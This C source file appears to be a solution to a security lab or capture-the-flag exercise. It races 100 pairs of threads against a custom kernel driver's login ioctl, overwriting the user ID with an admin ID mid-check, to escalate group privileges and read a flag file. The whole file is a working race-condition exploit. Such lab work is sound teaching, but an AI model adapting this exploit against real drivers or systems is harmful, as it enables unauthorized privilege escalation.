//gcc -o 3.bin  3.c
#include <stdio.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <stdlib.h>

#define DEVFILE		"lab73_login"
#define CMD_LOGIN       100
#define LAB73WIN_ID	    1032
#define USERID_GUEST	9999
#define PASSWD_GUEST	123456
#define USERID_ADMIN	1337
#define TARGET_FILE "/home/se/Documents/labs/lab7/attmpt1_7-3/flag.txt"
//#define TARGET_FILE "/home/lab7-3/flag.txt"


pthread_t tAttacker[100], tUserLogin[100];
int fd;


struct login_creds {
	long int userid;
	long int passwd;
};

struct login_creds login;

void PrintFlag() {
	
	printf("\n [*] %d\n", getegid());
	
	FILE *file = fopen(TARGET_FILE, "r");
	if (file != NULL) {
		char buffer[100];  // Buffer to store read content
		while (fgets(buffer, sizeof(buffer), file) != NULL) {
			printf("%s", buffer);  // Display each line to the console
		}
		fclose(file);
	} else {
		perror("Error opening file");
	}
	printf("\n [*] %d\n", getegid());
}

void *UserLogin(void *arg) {

	login.userid = USERID_GUEST;
	login.passwd = PASSWD_GUEST;
	ioctl(fd, CMD_LOGIN, &login);
	printf("[/] UL2: GID <%d>\n", getegid());	

	if (getegid() == LAB73WIN_ID) {
		
		//pause threads
		printf("Group Privileges have been escalated to LAB73WIN_ID!\n");
		PrintFlag();
		pthread_exit(NULL);
	}
	
	pthread_exit(NULL);
}

void *Attacker(void *arg) {
	for (int i = 0; i < 100; i++) {
		usleep(5);


		login.userid = USERID_ADMIN;
		ioctl(fd, CMD_LOGIN, &login);
 		printf("[/] AL: GID <%d>\n", getegid());


		if (getegid() == LAB73WIN_ID) {
			//pause threads
			printf("Group Privileges have been escalated to LAB73WIN_ID!\n");
			PrintFlag();
			pthread_exit(NULL);
		}
	}
	pthread_exit(NULL);
}

int main(int argc, char *argv[]) {

	fd = open("/dev/"DEVFILE, O_RDWR);
	if (fd < 0) {
		perror("open");
		return 0;
	}

	for (int i = 0; i < 100; i++) {
		pthread_create(&tUserLogin[i], NULL, UserLogin, NULL);
		pthread_create(&tAttacker[i], NULL, Attacker, NULL);
	}

	for (int i = 0; i < 100; i++) {
		pthread_join(tUserLogin[i], NULL);
		pthread_join(tAttacker[i], NULL);
	}

	close(fd);


	return 0;
}
